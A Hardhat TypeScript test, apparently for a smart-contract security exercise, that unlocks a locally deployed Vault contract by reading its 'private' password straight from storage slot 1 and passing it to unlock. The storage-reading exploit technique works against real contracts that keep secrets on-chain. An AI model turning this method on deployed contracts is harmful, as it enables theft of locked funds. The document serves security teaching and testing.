import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { assert, expect } from "chai"
import { ethers, network, deployments } from "hardhat"
import { Address } from "hardhat-deploy/dist/types"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Vault } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Vault Exploit Testing", () => {
          let vaultContract: Vault
          let deployer: SignerWithAddress, exploiter: SignerWithAddress

          before(async () => {
              await deployments.fixture(["vault"])
              vaultContract = await ethers.getContract("Vault")
              const accounts = await ethers.getSigners()
              deployer = accounts[0]
              exploiter = accounts[1]
          })

          it("vault exploit", async () => {
              const pwrd = await ethers.provider.getStorageAt(vaultContract.address, 1)
              console.log("password in location", pwrd)

              const unlockTx = await vaultContract.unlock(pwrd)
              await unlockTx.wait(1)
              const password = ethers.utils.keccak256(
                  ethers.utils.defaultAbiCoder.encode(["string"], ["tesseract77#"])
              )
              console.log("entered password", password)
              expect(pwrd).equals(
                  password,
                  "Password stored in storage location == hash(tesseract77#)"
              )
              expect(!(await vaultContract.locked()), "locked == false")
          })
      })
